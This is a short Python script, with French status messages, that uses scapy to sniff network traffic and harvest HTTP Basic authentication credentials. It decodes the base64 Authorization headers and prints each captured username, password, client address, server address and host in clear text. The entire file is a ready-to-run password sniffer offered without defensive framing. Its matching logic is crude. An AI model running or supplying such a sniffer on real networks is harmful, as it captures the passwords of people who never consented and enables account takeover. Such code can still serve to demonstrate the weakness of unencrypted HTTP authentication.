from scapy.all import *
import base64

credentials = []
host = []


def check_login_http(trame):
    global credentials, host
    if trame.haslayer("TCP") and trame.haslayer("Raw"):
        if (trame[0][1].dport) == 80 or (trame[0][1].sport) == 80:
            data = str(trame[Raw].load)
            if "Authorization: Basic" in data:
                data = data.split("Basic ")[1]
                data = list(data.split(r"\r\n"))
                cred = list(base64.b64decode(data[0]).decode("utf-8").split(":"))
                credentials.append(cred)
            elif "Host" in data:
                data = data.split("Host: ")[1]
                data = list(data.split(r"\r\n"))
                host.append(data[0])
            elif "200" in data:
                if not credentials == False:
                    print("\n")
                    print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
                    print(f"^*^ Un utilisateur est connect√©")
                    print(f"^*^ Client : {trame[0][1].dst} Serveur : {trame[0][1].src}")
                    print(f"^*^ Host : {host[-1]}")
                    print(f"^*^ Username : {credentials[-1][-0]}")
                    print(f"^*^ Password : {credentials[-1][-1]}")
                    print("\n")


print(f"On commence le 'sniffing' sur la carte {conf.iface}:")
print("\n")
sniff(prn=check_login_http, store=0, iface=conf.iface)
